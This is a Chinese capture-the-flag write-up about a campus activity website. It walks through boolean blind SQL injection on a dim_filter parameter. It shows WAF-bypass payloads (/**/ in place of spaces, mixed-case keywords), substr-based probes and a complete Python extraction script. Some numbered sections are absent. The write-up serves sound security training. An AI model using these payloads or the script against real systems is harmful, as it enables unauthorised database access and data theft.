
## 一、初步探索

打开靶机首页，映入眼帘的是一个看似平凡的“校园社团活动平台”。尽管直观上找不到任何表单交互区域或后台登录链接，但通过审查 HTML 源代码，我们可以发现隐藏的诸多线索。

首页存在几个引人瞩目的细节：

1. 在顶部导航栏中，“活动”与“管理”这两个词汇被刻意做了高亮处理。
2. 页面底部隐藏着如下提示语：

```text
访问核心功能需：用户代理+官方来源页+校园令牌
```

3. 当触发“加载更多”活动数据时，前端向后端发起了如下请求：

```text
/?page=2
```

当我们尝试在浏览器中直接请求该接口，其返回的 HTTP 响应头里额外携带了一项核心数据：

```http
X-Campus-Token: campus-ctf-2024-abc123
```

由此可知，解锁后续核心接口所需的三个前置条件之一，在首页已经被明文透出了。

## 四、锁定 SQL 注入漏洞

请求以下路径：

```text
/admin/stat/activity/
```

页面内含有一个采用 GET 方式提交的参数：

```html
<input type="text" id="dim_filter" name="dim_filter" ...>
```

不仅如此，HTML 源码内还潜藏了三条重要线索：

### 1. `title` 属性中的线索

```text
该参数会作为统计结果的别名使用
```

### 2. `data-hint` 中的提示

```text
SQL语句格式为SELECT COUNT(*) AS [维度值] FROM activity
```

### 3. HTML 注释信息

```text
Flag存储在flag表的value字段，可通过构造条件判断字符是否正确
WAF会过滤空格和完整关键词，可用/**/替代空格，简化关键词绕过
```

结合上述所有信息，思路已经呼之欲出：

- 漏洞触发点就是参数 `dim_filter`
- 后台执行的 SQL 查询骨架类似于 `SELECT COUNT(*) ... FROM activity`
- 目标 flag 被存放在表名为 `flag` 的 `value` 列内
- 必须借助布尔（Boolean）盲注技术来逐个推断字符
- 前置条件是需突破一层简易的 WAF 防护

## 五、参数特性剖析

首先进行一系列常规探测：

```text
?dim_filter=1
?dim_filter=0
?dim_filter=1=1
?dim_filter=1=2
?dim_filter=2>1
?dim_filter=2<1
```

分析页面回显：

- 表达式成立（True）时，页面渲染出 `✅ 10`
- 表达式不成立（False）时，页面渲染出 `✅ 0`

这足以证明，后端并没有仅将 `dim_filter` 视作单纯的列别名处理，而是将其作为可执行的条件表达式带入了 SQL 语句中。

这意味着我们找到了一个极其可靠的布尔状态判断依据：

- 页面回显 `10` 代表逻辑为真
- 页面回显 `0` 代表逻辑为假

这完美契合了典型的布尔盲注利用模型。

## 六、突破 WAF 限制

根据先前发现的源码提示：

- 所有的空格字符都会遭拦截
- 完整的 SQL 敏感词汇会触发安全防护
- 能够利用 `/**/` 来充当空格符

经过实操检验，直接输入如下常规字符会被 WAF 阻断：

```sql
FROM
WHERE
SELECT
```

然而，一旦结合大小写字母交替与多行注释符替换空格，就能顺利穿透防护：

```sql
SeLeCt/**/value/**/FrOm/**/flag
```

基于此，在接下来的盲注过程中，我们将全面采用此构造模式。

---

## 七、盲注可行性校验

首先核实 flag 首字母是不是 `I`：

```text
?dim_filter=substr((SeLeCt/**/value/**/FrOm/**/flag),1,1)='I'
```

页面返回结果：

```text
✅ 10
```

接着用一个显然错误的字符进行比对：

```text
?dim_filter=substr((SeLeCt/**/value/**/FrOm/**/flag),1,1)='X'
```

页面返回结果：

```text
✅ 0
```

以上测试印证了注入通道已彻底畅通无阻，余下工作仅仅是进行逐字遍历爆破。

## 九、按位爆破提取 flag

### 1. 手动推导原理

通过设定偏移量 `n` 逐一校验字符：

```sql
substr((SeLeCt/**/value/**/FrOm/**/flag),n,1)='x'
```

一旦页面出现 `✅ 10`，即代表当前猜测的字符命中。

比如：

```text
substr((SeLeCt/**/value/**/FrOm/**/flag),1,1)='I'
substr((SeLeCt/**/value/**/FrOm/**/flag),2,1)='S'
substr((SeLeCt/**/value/**/FrOm/**/flag),3,1)='C'
...
```

由于手工测试 27 个字符效率低下，编写自动化脚本是更为明智的选择。

### 2. 自动化利用脚本

此处提供一份基于 Python 编写的完整利用脚本。其核心执行流程如下：

- 优先探测目标字符串的长度
- 遍历所有可能字符进行逐位比对
- 以页面返回文本中是否包含 `10` 作为真假判定标准

```python
import requests
import re
import string

base = "http://39.105.213.28:8000/admin/stat/activity/"
headers = {
    "User-Agent": "Campus-Stat/1.0",
    "Referer": "https://campus-stat.example.com/",
    "X-Campus-Token": "campus-ctf-2024-abc123",
}

charset = string.ascii_letters + string.digits + string.punctuation

def query(expr):
    r = requests.get(base, headers=headers, params={"dim_filter": expr}, timeout=10)
    m = re.search(r'<div class="count">(.*?)</div>', r.text, re.S)
    if not m:
        return False
    return "10" in m.group(1)

length = None
for i in range(1, 80):
    expr = f"length((SeLeCt/**/value/**/FrOm/**/flag))={i}"
    if query(expr):
        length = i
        print("[+] length =", length)
        break

flag = ""
for pos in range(1, length + 1):
    for ch in charset:
        if ch == "'":
            continue
        expr = f"substr((SeLeCt/**/value/**/FrOm/**/flag),{pos},1)='{ch}'"
        if query(expr):
            flag += ch
            print(f"[+] pos {pos}: {flag}")
            break

print("[+] flag =", flag)
```

## 十、后半程引入二分查找的优势

靶机服务器在响应请求时偶有延迟或超时现象，若字符集较宽，单一位的爆破可能会消耗大量的网络请求。

为了提高稳定性，最优方案是将其转换为对字符的 ASCII/Unicode 编码进行二分查找。

由于后台环境允许使用 `unicode()` 函数，构造语句如下：

```sql
unicode(substr((SeLeCt/**/value/**/FrOm/**/flag),22,1))>=80
```

凭借返回的布尔状态不断折半缩小取值区间，从而迅速锁定正确字符。

该方案的明显优点在于：

- 极大减少了探测单个字符所需的发包量
- 整体速度远超线性遍历字典
- 在目标站点网络状况欠佳时尤为可靠

## 十二、渗透利用链路复盘

本题的整体破题流程总结如下：

1. 打开网站首页，从页面元素中挖掘出“活动 / 管理 / 统计”这三个关键术语以及底部的隐晦提示。
2. 请求 `/?page=2`，在 HTTP 回应首部截获到 `X-Campus-Token`。
3. 排查 `robots.txt` 规则，发现隐藏文件 `/static/hint/tech_stack.txt`。
4. 查阅该提示文档，成功拿到另外两项认证信息：
   - 合法的 `User-Agent`
   - 匹配的 `Referer`
5. 逐一探勘 `/admin/`、`/stat/` 与 `/activity/` 目录，拼凑出部分 flag 碎片。
6. 组合前述关键词得到隐藏路径 `/admin/stat/activity/`，从而直达真实的后台仪表盘。
7. 阅读网页源码注释，确立 `dim_filter` 即为 SQL 注入的突破口。
8. 依据系统预留的提示词明确：
   - 后台数据库查询的结构
   - 存储 flag 的具体表名及列名
   - 穿越安全检查的技巧
9. 借助布尔盲注技术把 flag 逐位提取出来。

这道题目是经典的“线索嵌套型 Web 挑战”：

- 初始线索散落于前端渲染内容
- 进阶线索藏匿于 HTTP 通信头部
- 隐藏指引暴露在 `robots.txt` 之中
- 深层提示通过路径拼凑触发
- 终极漏洞落脚在 GET 参数的 SQL 注入上

倘若前期情报搜集出现遗漏，后续的渗透步骤将寸步难行。

## 十三、核心考点总结

### 1. 突破视觉局限

网页的可见区域并非全部，HTML 源代码、开发者注释、网络请求头乃至纯文本提示文件，都是至关重要的信息源。

### 2. 警惕双关词汇

题目刻意强调的“活动”、“管理”、“统计”，绝非单纯的文案修饰，实则是指引选手拼接真实 URL 目录的暗号：

```text
/admin/stat/activity/
```

### 3. 简易 WAF 的脆弱性

由于防御机制仅针对空白符及特定完整关键字进行了正则拦截，我们只需采用：

- 多行注释符 `/**/` 占位填补空格
- 对关键字字母进行大小写交替变换

便可轻松瓦解其防护。

### 4. 盲注的核心在于捕捉状态差异

落实布尔盲注的首要任务，便是发掘出能够明确区分 True/False 状态的页面差异特征，随后的工作皆可交由代码自动完成。

正如本题展示的特征：

- `✅ 10` 对应逻辑真
- `✅ 0` 对应逻辑假

此种极具规律的回显，简直是为脚本化量身定做。
